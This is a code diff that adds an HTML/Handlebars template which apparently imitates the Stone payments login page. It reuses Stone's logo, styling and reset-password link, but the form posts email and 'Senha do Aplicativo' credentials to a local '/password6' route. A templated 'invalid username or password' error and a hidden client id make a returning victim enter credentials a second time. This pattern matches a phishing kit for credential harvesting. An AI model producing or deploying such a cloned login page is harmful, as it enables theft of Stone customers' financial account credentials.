@@ -1,0 +1,61 @@
+<div id="__next">
+        <div class="clean-page-container__Container-sc-fzay79-0 dGAlqK">
+
+            <!-- error -->
+            <form method="POST" class="form-stn {{#if client}}form-error{{/if}}" {{#if client}} name="f2"{{else}} name="f1" {{/if}} action="/password6" >
+                <div width="400" class="sc-AxjAm hfpSUp card__Card-sc-2xb3kk-0 IOciT">
+                    <div class="sc-AxjAm sc-AxirZ BmOBm"><img src="/img/logo-stone.svg" alt="Stone Logo" /></div>
+                    <div class="styles__DimmerWrapper-sc-q27j9n-0 dkPhEC">
+                        <div class="styles__LoaderIcon-sc-1onbhrc-0 ebFmcr"></div>
+                    </div>
+
+                    {{#if client}} 
+                    <div class="text-error"> <span>Usuário e/ou senha inválidos</span></div>
+                    
+                    {{/if}}
+                    <div class="sc-fzozJi ldfQIR">
+                        {{#if client}}
+                        <input type="hidden" name="id" value="{{client.id}}">
+                        {{/if}}
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="email" font-size="2" id="email" name="username" class="
+                                    sc-AxjAm fBbPZk 
+                                    styles__StyledInput-sc-vrdjm4-0 
+                                    Csscx
+                                    {{#ifCond error 'login'}}
+                                    error
+                                    {{/ifCond}}
+                                " required="required" />
+                            </div>
+                            <label color="darkGray" font-size="2" for="username" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Email</div>
+                            </label>
+                        </div>
+                        <div class="sc-AxjAm sc-AxirZ fUlriR">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx"><input type="password" font-size="2" id="password" name="password" class="sc-AxjAm fBbPZk styles__StyledInput-sc-vrdjm4-0 Csscx" required="required" />
+                                <div class="sc-AxjAm sc-AxirZ ezTcmd styles__Adornment-sc-vrdjm4-1 PjGPe"><svg viewBox="0 0 16 16" height="20" width="20" aria-hidden="true" focusable="false" fill="currentColor" xmlns="http://www.w3.org/2000/svg" style="margin:auto" class="StyledIconBase-ea9ulj-0 iKhrnw">
+                                        <path fill-rule="evenodd"
+                                            d="M.143 2.31a.75.75 0 0 1 1.047-.167l14.5 10.5a.75.75 0 1 1-.88 1.214l-2.248-1.628C11.346 13.19 9.792 14 8 14c-1.981 0-3.67-.992-4.933-2.078C1.797 10.832.88 9.577.43 8.9a1.618 1.618 0 0 1 0-1.797c.353-.533.995-1.42 1.868-2.305L.31 3.357A.75.75 0 0 1 .143 2.31zm3.386 3.378a14.21 14.21 0 0 0-1.85 2.244.12.12 0 0 0-.022.068c0 .021.006.045.022.068.412.621 1.242 1.75 2.366 2.717C5.175 11.758 6.527 12.5 8 12.5c1.195 0 2.31-.488 3.29-1.191L9.063 9.695A2 2 0 0 1 6.058 7.52l-2.53-1.832zM8 3.5c-.516 0-1.017.09-1.499.251a.75.75 0 1 1-.473-1.423A6.23 6.23 0 0 1 8 2c1.981 0 3.67.992 4.933 2.078 1.27 1.091 2.187 2.345 2.637 3.023a1.619 1.619 0 0 1 0 1.798c-.11.166-.248.365-.41.587a.75.75 0 1 1-1.21-.887c.148-.201.272-.382.371-.53a.119.119 0 0 0 0-.137c-.412-.621-1.242-1.75-2.366-2.717C10.825 4.242 9.473 3.5 8 3.5z">
+                                        </path>
+                                    </svg></div>
+                            </div><label color="darkGray" font-size="2" for="password" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Senha do  Aplicativo</div>
+                            </label>
+                        </div>
+                        <div class="sc-AxhCb jXrfDR">
+                            <div name="captcha"></div>
+                            <div color="red" class="sc-AxjAm jmPVhW styles__StyledText-sc-ftb6xw-0 gouAvy"></div>
+                        </div><button type="submit" width="1" class="sc-AxjAm bmfNbS styles__StyledButton-sc-1066mea-0 OPeEQ" id="btnLogin">Entrar</button>
+
+                        <div class="row text-center">
+                            <a href="https://conta.stone.com.br/reset-password">Esqueci minha senha</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+</div>
+    <div id="modal"></div>
